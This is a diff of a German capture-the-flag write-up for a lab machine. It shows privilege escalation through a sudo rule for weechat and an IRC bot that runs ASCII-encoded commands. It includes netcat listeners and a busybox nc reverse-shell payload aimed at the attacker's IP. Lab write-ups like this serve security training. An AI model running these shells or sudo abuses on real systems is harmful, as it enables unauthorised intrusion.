     </div>
 </div>
-<p class="analysis">**Analyse:** Innerhalb der Reverse Shell als `www-data` wird `ls -la` im aktuellen Verzeichnis `/var/www/html/ShadowSec` ausgeführt. Die Ausgabe zeigt, dass die Datei `bydataset.php` dem Benutzer `root` gehört, aber `index.html` dem Benutzer `www-data`. Die Berechtigungen für `bydataset.php` sind `-rw-r--r--`, was bedeutet, dass `www-data` sie lesen (was wir bereits für die LFI und RCE genutzt haben), aber nicht schreiben kann.</p>
-<p class="evaluation">**Bewertung:** Bestätigt die Dateibesitzverhältnisse und Berechtigungen im aktuellen Verzeichnis. Die Tatsache, dass `bydataset.php` Root gehört, aber für alle lesbar ist, ermöglichte die LFI.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Führen Sie `sudo -l` aus, um zu prüfen, ob `www-data` sudo-Rechte hat.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Dateiberechtigungen dem Prinzip der geringsten Rechte folgen. Es ist ungewöhnlich, dass `index.html` `www-data` gehört, während `bydataset.php` `root` gehört, es sei denn, es gibt einen spezifischen Grund dafür. Einheitliche und restriktive Besitzverhältnisse sind vorzuziehen.</p>
+<p class="analysis">**Analyse:** Innerhalb der Reverse Shell als <span class="command">www-data</span> wird <span class="command">ls -la</span> im aktuellen Verzeichnis <span class="command">/var/www/html/ShadowSec</span> ausgeführt. Die Ausgabe zeigt, dass die Datei <span class="command">bydataset.php</span> dem Benutzer <span class="command">root</span> gehört, aber <span class="command">index.html</span> dem Benutzer <span class="command">www-data</span>. Die Berechtigungen für <span class="command">bydataset.php</span> sind <span class="command">-rw-r--r--</span>, was bedeutet, dass <span class="command">www-data</span> sie lesen (was wir bereits für die LFI und RCE genutzt haben), aber nicht schreiben kann.</p>
+<p class="evaluation">**Bewertung:** Bestätigt die Dateibesitzverhältnisse und Berechtigungen im aktuellen Verzeichnis. Die Tatsache, dass <span class="command">bydataset.php</span> Root gehört, aber für alle lesbar ist, ermöglichte die LFI.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie <span class="command">sudo -l</span> aus, um zu prüfen, ob <span class="command">www-data</span> sudo-Rechte hat.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Dateiberechtigungen dem Prinzip der geringsten Rechte folgen. Es ist ungewöhnlich, dass <span class="command">index.html</span> <span class="command">www-data</span> gehört, während <span class="command">bydataset.php</span> <span class="command">root</span> gehört, es sei denn, es gibt einen spezifischen Grund dafür. Einheitliche und restriktive Besitzverhältnisse sind vorzuziehen.</p>
         </section>
 
         <section id="privilege-escalation-wwwdata-to-chatlake">
             <h2>Privilege Escalation (www-data zu chatlake)</h2>
-<p class="comment">Nachdem wir eine Shell als `www-data` haben, suchen wir nach Möglichkeiten zur Privilegienerweiterung zum Benutzer `chatlake`.</p>
+<p class="comment">Nachdem wir eine Shell als <span class="command">www-data</span> haben, suchen wir nach Möglichkeiten zur Privilegienerweiterung zum Benutzer <span class="command">chatlake</span>.</p>
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">www-data@PyCrt:/home$ <span class="command">sudo -l</span>
@@ -1108,16 +1110,43 @@ Matching Defaults entries for www-data on PyCrt:
 User www-data may run the following commands on PyCrt:
     <span class="password">(chatlake) NOPASSWD: /usr/bin/weechat</span>
 </pre>
+    </div> 
+</div>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">sudo -l</span> wird als <span class="command">www-data</span> ausgeführt (der Prompt zeigt <span class="command">/home</span>, der Benutzer hat also das Verzeichnis gewechselt). Die Ausgabe ist sehr interessant: Der Benutzer <span class="command">www-data</span> darf den Befehl <span class="command">/usr/bin/weechat</span> als der Benutzer <span class="command">chatlake</span> ohne Passwort (<span class="command">NOPASSWD</span>) ausführen.</p>
+<p class="evaluation">**Bewertung:** Dies ist ein klarer Vektor zur Privilegienerweiterung von <span class="command">www-data</span> zu <span class="command">chatlake</span>. <span class="command">weechat</span> ist ein konsolenbasierter IRC-Client, der oft über interne Befehle verfügt, die es ermöglichen könnten, Shell-Befehle auszuführen oder auf das Dateisystem zuzugreifen, wenn er im Kontext eines anderen Benutzers gestartet wird.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie <span class="command">sudo -u chatlake /usr/bin/weechat</span> aus. Suchen Sie innerhalb von WeeChat nach Möglichkeiten, Befehle auszuführen (z.B. über <span class="command">/exec</span>, <span class="command">/shell</span> oder Plugin-Funktionen) oder eine Shell zu spawnen. GTFOBins (eine kuratierte Liste von Unix-Binaries, die für Privilegienerweiterung missbraucht werden können) ist eine gute Ressource, um nach Ausnutzungsmöglichkeiten für WeeChat im <span class="command">sudo</span>-Kontext zu suchen.<br>**Empfehlung (Admin):** Die Vergabe von <span class="command">sudo</span>-Rechten für interaktive Programme wie <span class="command">weechat</span>, insbesondere an einen Webserver-Benutzer, ist sehr riskant und sollte vermieden werden. Wenn ein Programm als ein anderer Benutzer ausgeführt werden muss, sollten spezifische, nicht-interaktive Skripte oder Befehle mit minimalen Rechten bevorzugt werden. Überprüfen Sie alle <span class="command">sudo</span>-Regeln sorgfältig auf potenzielle Missbrauchsmöglichkeiten.</p>
+
+<img src="webapp.jpg" alt="Ansicht der WeeChat-Anwendung, nachdem sie im Kontext von www-data für den Benutzer chatlake geladen wurde.">
+
+
+<p class="analysis">**Analyse des Bildes (webapp.jpg):** Das Bild zeigt die WeeChat-Konsolenanwendung. Dies ist die typische Ansicht, nachdem <span class="command">sudo -u chatlake /usr/bin/weechat</span> durch den <span class="command">www-data</span> Benutzer ausgeführt wurde. Von dieser IRC-Client-Oberfläche aus können weitere Befehle oder Aktionen initiiert werden, die dann im Kontext des Benutzers <span class="command">chatlake</span> ausgeführt werden. Dies ist der entscheidende Punkt, um Shell-Zugriff als <span class="command">chatlake</span> zu erlangen.</p>
+
+
+<img src="webapp_revshell_test.jpg" alt="Darstellung eines Tests oder Versuchs, eine Reverse Shell oder Befehlsausführung innerhalb der WeeChat-Umgebung zu initiieren.">
+
+
+<p class="analysis">**Analyse des Bildes (webapp_revshell_test.jpg):** Dieses Bild illustriert einen Moment während der Interaktion mit WeeChat. Es könnte den Versuch darstellen, einen WeeChat-internen Befehl (wie <span class="command">/exec -o sh</span>) einzugeben oder ein Skript zu laden, das eine Reverse Shell startet. Solche Aktionen innerhalb von WeeChat, das mit den Rechten von <span class="command">chatlake</span> läuft, ermöglichen es dem Pentester, von der reinen IRC-Client-Nutzung zu einer vollwertigen Shell als <span class="command">chatlake</span> überzugehen.</p>
+<p class="comment">Der genaue Befehl innerhalb von WeeChat, um die Shell zu spawnen (z.B. <span class="command">/exec -o sh</span> oder eine ähnliche Technik, die auf WeeChat-Plugins oder -Funktionen basiert), ist nicht explizit im Log-Text enthalten. Das Ergebnis dieser Aktion ist jedoch die Erlangung einer Shell als Benutzer <span class="command">chatlake</span>, typischerweise durch das Starten eines Netcat-Listeners auf der Angreifer-Maschine und das Senden einer Reverse-Shell-Payload aus WeeChat heraus. Im folgenden Log-Ausschnitt wird die erfolgreiche Verbindung zu einem solchen Listener auf Port 5559 gezeigt.</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">nc -lvnp 5559</span>
+        </div>
+        <pre>
+<span class="password">listening on [any] 5559 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.192] 50182</span>
+<span class="command">chatlake@PyCrt:/home$</span> 
+</pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `sudo -l` wird als `www-data` ausgeführt (der Prompt zeigt `/home`, der Benutzer hat also das Verzeichnis gewechselt). Die Ausgabe ist sehr interessant: Der Benutzer `www-data` darf den Befehl `/usr/bin/weechat` als der Benutzer `chatlake` ohne Passwort (`NOPASSWD`) ausführen.</p>
-<p class="evaluation">**Bewertung:** Dies ist ein klarer Vektor zur Privilegienerweiterung von `www-data` zu `chatlake`. `weechat` ist ein konsolenbasierter IRC-Client, der oft über interne Befehle verfügt, die es ermöglichen könnten, Shell-Befehle auszuführen oder auf das Dateisystem zuzugreifen, wenn er im Kontext eines anderen Benutzers gestartet wird.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Führen Sie `sudo -u chatlake /usr/bin/weechat` aus. Suchen Sie innerhalb von WeeChat nach Möglichkeiten, Befehle auszuführen (z.B. über `/exec`, `/shell` oder Plugin-Funktionen) oder eine Shell zu spawnen. GTFOBins (eine kuratierte Liste von Unix-Binaries, die für Privilegienerweiterung missbraucht werden können) ist eine gute Ressource, um nach Ausnutzungsmöglichkeiten für WeeChat im `sudo`-Kontext zu suchen.<br>**Empfehlung (Admin):** Die Vergabe von `sudo`-Rechten für interaktive Programme wie `weechat`, insbesondere an einen Webserver-Benutzer, ist sehr riskant und sollte vermieden werden. Wenn ein Programm als ein anderer Benutzer ausgeführt werden muss, sollten spezifische, nicht-interaktive Skripte oder Befehle mit minimalen Rechten bevorzugt werden. Überprüfen Sie alle `sudo`-Regeln sorgfältig auf potenzielle Missbrauchsmöglichkeiten.</p>
+<p class="analysis">**Analyse:** Der Netcat-Listener auf Port <span class="command">5559</span> empfängt eine Verbindung vom Zielsystem. Der Shell-Prompt <span class="command">chatlake@PyCrt:/home$</span> bestätigt, dass wir nun eine interaktive Shell als Benutzer <span class="command">chatlake</span> haben.</p>
+<p class="evaluation">**Bewertung:** Fantastisch! Die Privilegienerweiterung von <span class="command">www-data</span> zu <span class="command">chatlake</span> war erfolgreich durch die kreative Ausnutzung der <span class="command">sudo</span>-Regel für WeeChat.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie als <span class="command">chatlake</span> den Befehl <span class="command">id</span> zur Bestätigung aus und dann <span class="command">sudo -l</span>, um nach weiteren sudo-Privilegien zu suchen, die zur nächsten Eskalationsstufe führen könnten.<br>**Empfehlung (Admin):** Wie zuvor erwähnt, ist die Vergabe von <span class="command">sudo</span>-Rechten für interaktive Programme an niedrig privilegierte Benutzer ein hohes Risiko. Solche Konfigurationen sollten vermieden werden.</p>
         </section>
 
         <section id="privilege-escalation-chatlake-to-pycrtlake">
             <h2>Privilege Escalation (chatlake zu pycrtlake via IRC Bot)</h2>
-<p class="comment">Nachdem wir durch Ausnutzung der `sudo`-Regel für WeeChat als `chatlake` agieren können (die Ausführung wird in den Bildern und den folgenden Schritten gezeigt, auch wenn der direkte WeeChat-Exploit hier nicht im Text detailliert ist), suchen wir nach Wegen, um von `chatlake` weiter zu `pycrtlake` oder Root zu eskalieren. Die IRC-Interaktionen scheinen hier eine zentrale Rolle zu spielen, insbesondere ein IRC-Bot, der auf Befehle reagiert.</p>
+<p class="comment">Nachdem wir durch Ausnutzung der <span class="command">sudo</span>-Regel für WeeChat als <span class="command">chatlake</span> agieren, suchen wir nach Wegen, um von <span class="command">chatlake</span> weiter zu <span class="command">pycrtlake</span> oder Root zu eskalieren. Die IRC-Interaktionen scheinen hier eine zentrale Rolle zu spielen, insbesondere ein IRC-Bot, der auf Befehle reagiert.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1128,9 +1157,9 @@ User www-data may run the following commands on PyCrt:
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der `id`-Befehl bestätigt, dass der aktuelle Benutzer `chatlake` (UID 1001) ist. Dies wurde durch die Ausnutzung der `sudo -u chatlake /usr/bin/weechat`-Regel erreicht (der genaue Mechanismus, wie aus WeeChat eine Shell als `chatlake` gespawnt wurde, ist hier nicht detailliert, wird aber angenommen).</p>
-<p class="evaluation">**Bewertung:** Erfolgreiche Eskalation von `www-data` zu `chatlake`. Nun muss von dieser Position aus weiter eskaliert werden.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Führen Sie `sudo -l` als `chatlake` aus, um dessen sudo-Privilegien zu prüfen. Untersuchen Sie das Home-Verzeichnis von `chatlake` und andere für diesen Benutzer lesbare Dateien.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlung zur `sudo`-Regel für WeeChat.</p>
+<p class="analysis">**Analyse:** Der <span class="command">id</span>-Befehl bestätigt, dass der aktuelle Benutzer <span class="command">chatlake</span> (UID 1001) ist.</p>
+<p class="evaluation">**Bewertung:** Erfolgreiche Eskalation von <span class="command">www-data</span> zu <span class="command">chatlake</span> ist bestätigt.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Führen Sie <span class="command">sudo -l</span> als <span class="command">chatlake</span> aus, um dessen sudo-Privilegien zu prüfen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlung zur <span class="command">sudo</span>-Regel für WeeChat.</p>
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">chatlake@PyCrt:/home$ <span class="command">sudo -l</span>
@@ -1145,9 +1174,9 @@ User chatlake may run the following commands on PyCrt:
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** `sudo -l` als `chatlake` zeigt, dass dieser Benutzer den Befehl `/usr/bin/systemctl start irc_bot.service` als `ALL` (also als jeder Benutzer, einschließlich Root) ohne Passwort ausführen darf.</p>
-<p class="evaluation">**Bewertung:** Dies ist ein weiterer vielversprechender Vektor zur Privilegienerweiterung. Wenn wir den `irc_bot.service` so manipulieren können, dass er beim Start bösartigen Code ausführt (z.B. eine Reverse Shell als Root oder als der Benutzer, unter dem der Service gestartet wird), können wir potenziell höhere Rechte erlangen. Die Angabe `(ALL)` ist hier sehr mächtig.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Service-Datei `irc_bot.service`. Finden Sie heraus, wo sie sich befindet (typischerweise unter `/etc/systemd/system/`, `/usr/lib/systemd/system/` oder ähnlichen Pfaden) und ob `chatlake` Schreibrechte auf diese Datei oder auf Skripte hat, die von diesem Dienst ausgeführt werden. Wenn ja, modifizieren Sie die Datei/Skripte und starten Sie den Dienst dann mit `sudo /usr/bin/systemctl start irc_bot.service`. Die IRC-Interaktionen, die im weiteren Verlauf des Berichts detailliert werden, deuten darauf hin, dass dieser `irc_bot.service` auf ASCII-kodierte Befehle im IRC reagiert und diese als `pycrtlake` ausführt.<br>**Empfehlung (Admin):** `sudo`-Regeln, die `systemctl start` für beliebige Dienste erlauben, sind extrem gefährlich, besonders wenn der Dienst selbst oder die von ihm ausgeführten Skripte von einem weniger privilegierten Benutzer manipuliert werden können. Der Grundsatz des geringsten Privilegs muss hier strikt angewendet werden. Wenn ein Benutzer einen Dienst starten muss, sollte dies über ein Wrapper-Skript erfolgen, das keine Manipulation des Dienstes selbst erlaubt, oder die Berechtigungen auf die Service-Unit-Datei und die zugehörigen Skripte müssen sehr restriktiv sein.</p>
+<p class="analysis">**Analyse:** <span class="command">sudo -l</span> als <span class="command">chatlake</span> zeigt, dass dieser Benutzer den Befehl <span class="command">/usr/bin/systemctl start irc_bot.service</span> als <span class="command">ALL</span> (also als jeder Benutzer, einschließlich Root) ohne Passwort ausführen darf.</p>
+<p class="evaluation">**Bewertung:** Dies ist ein weiterer vielversprechender Vektor zur Privilegienerweiterung. Wenn wir den <span class="command">irc_bot.service</span> so manipulieren können, dass er beim Start bösartigen Code ausführt (z.B. eine Reverse Shell als Root oder als der Benutzer, unter dem der Service gestartet wird), können wir potenziell höhere Rechte erlangen. Die Angabe <span class="command">(ALL)</span> ist hier sehr mächtig.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Service-Datei <span class="command">irc_bot.service</span>. Finden Sie heraus, wo sie sich befindet (typischerweise unter <span class="command">/etc/systemd/system/</span>, <span class="command">/usr/lib/systemd/system/</span> oder ähnlichen Pfaden) und ob <span class="command">chatlake</span> Schreibrechte auf diese Datei oder auf Skripte hat, die von diesem Dienst ausgeführt werden. Wenn ja, modifizieren Sie die Datei/Skripte und starten Sie den Dienst dann mit <span class="command">sudo /usr/bin/systemctl start irc_bot.service</span>. Die IRC-Interaktionen, die im weiteren Verlauf des Berichts detailliert werden, deuten darauf hin, dass dieser <span class="command">irc_bot.service</span> auf ASCII-kodierte Befehle im IRC reagiert und diese als <span class="command">pycrtlake</span> ausführt.<br>**Empfehlung (Admin):** <span class="command">sudo</span>-Regeln, die <span class="command">systemctl start</span> für beliebige Dienste erlauben, sind extrem gefährlich, besonders wenn der Dienst selbst oder die von ihm ausgeführten Skripte von einem weniger privilegierten Benutzer manipuliert werden können. Der Grundsatz des geringsten Privilegs muss hier strikt angewendet werden. Wenn ein Benutzer einen Dienst starten muss, sollte dies über ein Wrapper-Skript erfolgen, das keine Manipulation des Dienstes selbst erlaubt, oder die Berechtigungen auf die Service-Unit-Datei und die zugehörigen Skripte müssen sehr restriktiv sein.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1156,9 +1185,9 @@ User chatlake may run the following commands on PyCrt:
         <pre></pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Pentester führt den Befehl `sudo -u root /usr/bin/systemctl start irc_bot.service` aus. Da `chatlake` diesen Dienst als `(ALL)` starten darf, ist die explizite Angabe `-u root` nicht zwingend notwendig, aber sie verdeutlicht die Absicht. Dieser Befehl startet den `irc_bot.service`.</p>
+<p class="analysis">**Analyse:** Der Pentester führt den Befehl <span class="command">sudo -u root /usr/bin/systemctl start irc_bot.service</span> aus. Da <span class="command">chatlake</span> diesen Dienst als <span class="command">(ALL)</span> starten darf, ist die explizite Angabe <span class="command">-u root</span> nicht zwingend notwendig, aber sie verdeutlicht die Absicht. Dieser Befehl startet den <span class="command">irc_bot.service</span>.</p>
 <p class="evaluation">**Bewertung:** Dieser Schritt aktiviert den IRC-Bot. Die eigentliche Ausnutzung erfolgt dann über die Interaktion mit diesem Bot über einen IRC-Client.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Verbinden Sie sich mit einem IRC-Client (z.B. Irssi, WeeChat) mit dem IRC-Server (`192.168.2.192:6667`) und versuchen Sie, mit dem Bot zu interagieren. Der spätere Teil des Berichts zeigt, dass der Bot auf numerische ASCII-Payloads reagiert, die dann als Benutzer `pycrtlake` ausgeführt werden. Es muss herausgefunden werden, wie der Bot angesprochen wird (z.B. in einem bestimmten Kanal oder per Privatnachricht) und wie die Befehle formatiert sein müssen.<br>**Empfehlung (Admin):** Überwachen Sie das Starten und Stoppen von Diensten. Wenn Dienste so konfiguriert sind, dass sie von Benutzern gestartet werden können, stellen Sie sicher, dass die Dienste selbst sicher sind und keine manipulierbaren Komponenten enthalten.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Verbinden Sie sich mit einem IRC-Client (z.B. Irssi, WeeChat) mit dem IRC-Server (<span class="command">192.168.2.192:6667</span>) und versuchen Sie, mit dem Bot zu interagieren. Der spätere Teil des Berichts zeigt, dass der Bot auf numerische ASCII-Payloads reagiert, die dann als Benutzer <span class="command">pycrtlake</span> ausgeführt werden. Es muss herausgefunden werden, wie der Bot angesprochen wird (z.B. in einem bestimmten Kanal oder per Privatnachricht) und wie die Befehle formatiert sein müssen.<br>**Empfehlung (Admin):** Überwachen Sie das Starten und Stoppen von Diensten. Wenn Dienste so konfiguriert sind, dass sie von Benutzern gestartet werden können, stellen Sie sicher, dass die Dienste selbst sicher sind und keine manipulierbaren Komponenten enthalten.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1173,21 +1202,20 @@ drwxr-xr-x 18 root      root      4096 Mar 18 20:37 ..
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** `ls -la` im Verzeichnis `/home` zeigt die Home-Verzeichnisse der Benutzer `chatlake` und `pycrtlake`. Beide Verzeichnisse haben restriktive Berechtigungen (`drwx------`), was bedeutet, dass nur der jeweilige Besitzer und Root darauf zugreifen können.</p>
-<p class="evaluation">**Bewertung:** Standardkonfiguration für Home-Verzeichnisse. Als `chatlake` können wir das Verzeichnis von `pycrtlake` nicht direkt einsehen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Da wir nun wissen, dass der `irc_bot.service` (der vermutlich als `pycrtlake` läuft, basierend auf späteren Ausgaben) gestartet wurde, ist die Interaktion über IRC der nächste Schritt.<br>**Empfehlung (Admin):** Korrekte Berechtigungen für Home-Verzeichnisse sind wichtig, um die Daten der Benutzer voreinander zu schützen.</p>
+<p class="analysis">**Analyse:** <span class="command">ls -la</span> im Verzeichnis <span class="command">/home</span> zeigt die Home-Verzeichnisse der Benutzer <span class="command">chatlake</span> und <span class="command">pycrtlake</span>. Beide Verzeichnisse haben restriktive Berechtigungen (<span class="command">drwx------</span>), was bedeutet, dass nur der jeweilige Besitzer und Root darauf zugreifen können.</p>
+<p class="evaluation">**Bewertung:** Standardkonfiguration für Home-Verzeichnisse. Als <span class="command">chatlake</span> können wir das Verzeichnis von <span class="command">pycrtlake</span> nicht direkt einsehen.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Da wir nun wissen, dass der <span class="command">irc_bot.service</span> (der vermutlich als <span class="command">pycrtlake</span> läuft, basierend auf späteren Ausgaben) gestartet wurde, ist die Interaktion über IRC der nächste Schritt.<br>**Empfehlung (Admin):** Korrekte Berechtigungen für Home-Verzeichnisse sind wichtig, um die Daten der Benutzer voreinander zu schützen.</p>
 
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">chatlake@PyCrt:/home$ <span class="command">cd chatlake/</span>
         </div>
-        <pre>
-</pre>
+        <pre></pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Benutzer `chatlake` wechselt in sein eigenes Home-Verzeichnis.</p>
+<p class="analysis">**Analyse:** Der Benutzer <span class="command">chatlake</span> wechselt in sein eigenes Home-Verzeichnis.</p>
 <p class="evaluation">**Bewertung:** Logischer Schritt, um das eigene Home-Verzeichnis zu untersuchen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Suchen Sie im Home-Verzeichnis von `chatlake` nach interessanten Dateien, Skripten, Konfigurationsdateien oder Hinweisen, die für die weitere Eskalation nützlich sein könnten. Hier wird die User-Flag gefunden.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Suchen Sie im Home-Verzeichnis von <span class="command">chatlake</span> nach interessanten Dateien, Skripten, Konfigurationsdateien oder Hinweisen, die für die weitere Eskalation nützlich sein könnten. Hier wird die User-Flag gefunden.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1198,10 +1226,10 @@ drwxr-xr-x 18 root      root      4096 Mar 18 20:37 ..
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `cat user.txt` im Home-Verzeichnis von `chatlake` gibt die User-Flag aus: `flag{b42baba466402e32157a1cbba819664e}`.</p>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">cat user.txt</span> im Home-Verzeichnis von <span class="command">chatlake</span> gibt die User-Flag aus: <span class="password">flag{b42baba466402e32157a1cbba819664e}</span>.</p>
 <p class="evaluation">**Bewertung:** Die erste Flag wurde erfolgreich gefunden!</p>
-<p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die User-Flag. Konzentrieren Sie sich nun auf die Privilegienerweiterung zum Benutzer `pycrtlake` (über den IRC-Bot) und dann zu Root.<br>**Empfehlung (Admin):** Flags sind CTF-spezifisch. In realen Szenarien sollten sensible Daten in Home-Verzeichnissen angemessen geschützt sein.</p>
-<p class="comment">Die folgenden Abschnitte zeigen die Interaktion mit dem IRC-Server und dem Bot. Der Pentester verwendet einen IRC-Client (Irssi oder WeeChat), verbindet sich zum Server und sendet speziell formatierte Nachrichten, die aus ASCII-Werten von Befehlen bestehen, an den Bot (der vermutlich im Kanal `#chan1` oder per Privatnachricht auf den Nick `admin` oder `Todd` hört). Der Bot führt diese Befehle dann im Kontext des Benutzers `pycrtlake` aus.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die User-Flag. Konzentrieren Sie sich nun auf die Privilegienerweiterung zum Benutzer <span class="command">pycrtlake</span> (über den IRC-Bot) und dann zu Root.<br>**Empfehlung (Admin):** Flags sind CTF-spezifisch. In realen Szenarien sollten sensible Daten in Home-Verzeichnissen angemessen geschützt sein.</p>
+<p class="comment">Die folgenden Abschnitte zeigen die Interaktion mit dem IRC-Server und dem Bot. Der Pentester verwendet einen IRC-Client (Irssi oder WeeChat), verbindet sich zum Server und sendet speziell formatierte Nachrichten, die aus ASCII-Werten von Befehlen bestehen, an den Bot (der vermutlich im Kanal <span class="command">#chan1</span> oder per Privatnachricht auf den Nick <span class="command">admin</span> oder <span class="command">Todd</span> hört). Der Bot führt diese Befehle dann im Kontext des Benutzers <span class="command">pycrtlake</span> aus.</p>
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">┌──(root㉿CCat)-[~]
@@ -1212,54 +1240,52 @@ drwxr-xr-x 18 root      root      4096 Mar 18 20:37 ..
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Pentester startet einen Netcat-Listener auf Port `6666` auf seiner Angreifer-Maschine. Dieser Listener dient dazu, eine Reverse Shell entgegenzunehmen, die vom IRC-Bot (der als `pycrtlake` läuft) ausgelöst werden soll.</p>
+<p class="analysis">**Analyse:** Der Pentester startet einen Netcat-Listener auf Port <span class="command">6666</span> auf seiner Angreifer-Maschine. Dieser Listener dient dazu, eine Reverse Shell entgegenzunehmen, die vom IRC-Bot (der als <span class="command">pycrtlake</span> läuft) ausgelöst werden soll.</p>
 <p class="evaluation">**Bewertung:** Vorbereitung für die nächste Stufe der Shell-Eskalation.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Bereiten Sie die Payload für den IRC-Bot vor. Diese Payload muss den Befehl für eine Reverse Shell (z.B. mit `busybox nc` oder Python) enthalten, in ASCII-Werte umgewandelt und im richtigen Format an den Bot gesendet werden.<br>**Empfehlung (Admin):** Überwachen Sie ausgehende Verbindungen von Ihren Servern. Dienste sollten nicht in der Lage sein, beliebige Befehle auszuführen oder unkontrollierte Netzwerkverbindungen aufzubauen.</p>
-
-<p class="comment">Der Pentester verwendet einen IRC-Client (Irssi/WeeChat) und ein Python-Skript (`hack_irc.py`), um eine Reverse-Shell-Payload (die `busybox nc -e /bin/bash 192.168.2.199 6666` ausführt) in ASCII-Werte umzuwandeln und an den IRC-Bot zu senden. Der Bot (der als Nick `Todd` im Kanal `#chan1` oder als `admin` agiert) empfängt diese ASCII-Payload, dekodiert sie zurück in einen Befehl und führt ihn als Benutzer `pycrtlake` aus. Dies führt dazu, dass eine Reverse Shell auf dem Netcat-Listener des Angreifers auf Port `6666` eingeht.</p>
-<p class="comment">Die Logs zeigen verschiedene Versuche, Befehle über den IRC-Bot auszuführen, einschließlich Fehlermeldungen vom Bot wie "[!] Format error or presence of illegal characters" oder "[!] Command execution failed", bis schließlich die korrekte Formatierung und ein erfolgreicher Befehl (die Reverse Shell) gefunden wird.</p>
-<p class="comment">Ein Bild (`<img>webapp_automatische_Nachricht_auf_chan6.jpg</img>`) zeigt eine automatische Nachricht im IRC-Kanal `#chan6` vom `@admin`-Bot: "My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End". Dies ist ein Hinweis auf das benötigte Format der Befehle (ASCII-kodiert und mit `:)` am Ende).</p>
-<div class="code-block">
-    <div class="terminal">
-        <pre>
-18:32:43 Todd | 119 104 111 97 109 105:)  
-</pre>
-    </div>
-</div>
-<div class="code-block">
-    <div class="terminal">
-        <pre>
-18:32:43 admin | [+] COMMAND EXECUTION：<span class="password">pycrtlake</span>
-</pre>
-    </div>
-</div>
-<p class="analysis">**Analyse:** Diese beiden Log-Ausschnitte zeigen eine erfolgreiche Interaktion mit dem IRC-Bot. Der Benutzer `Todd` (der IRC-Bot, der im Kontext von `chatlake` gestartet wurde, aber Befehle als `pycrtlake` ausführt) sendet den ASCII-kodierten Befehl für `whoami` (die Zahlen `119 104 111 97 109 105` entsprechen "whoami", gefolgt von `:)`). Der `admin`-Bot (oder ein Log-Mechanismus) bestätigt die Ausführung und gibt das Ergebnis `pycrtlake` zurück.</p>
-<p class="evaluation">**Bewertung:** Dies bestätigt, dass der IRC-Bot auf ASCII-kodierte Befehle reagiert und diese als Benutzer `pycrtlake` ausführt. Der Mechanismus zur Eskalation zu `pycrtlake` ist nun klar.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie diesen Mechanismus, um eine Reverse Shell als `pycrtlake` zu erhalten. Der Befehl `busybox nc -e /bin/bash 192.168.2.199 6666` (oder eine ähnliche Variante) muss ASCII-kodiert und mit `:)` am Ende an den Bot gesendet werden.<br>**Empfehlung (Admin):** IRC-Bots, die Befehle ausführen können, sind extrem gefährlich. Wenn eine solche Funktionalität benötigt wird, muss sie strengstens abgesichert, authentifiziert und auf ein Minimum an erlaubten Befehlen beschränkt werden. Die Annahme von ASCII-kodierten Befehlen ist eine Form der Obfuskation, aber keine wirkliche Sicherheitsmaßnahme.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Bereiten Sie die Payload für den IRC-Bot vor. Diese Payload muss den Befehl für eine Reverse Shell (z.B. mit <span class="command">busybox nc</span> oder Python) enthalten, in ASCII-Werte umgewandelt und im richtigen Format an den Bot gesendet werden.<br>**Empfehlung (Admin):** Überwachen Sie ausgehende Verbindungen von Ihren Servern. Dienste sollten nicht in der Lage sein, beliebige Befehle auszuführen oder unkontrollierte Netzwerkverbindungen aufzubauen.</p>
 
 <div class="code-block">
     <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi hack_irc.py</span>
+        </div>
         <pre>
-109 111 114 101 32 47 104 111 109 101 47 112 121 99 114 116 108 97 107 101 47 46 112 114 111 102 105 108 101
+      
+# ascii_converter.py
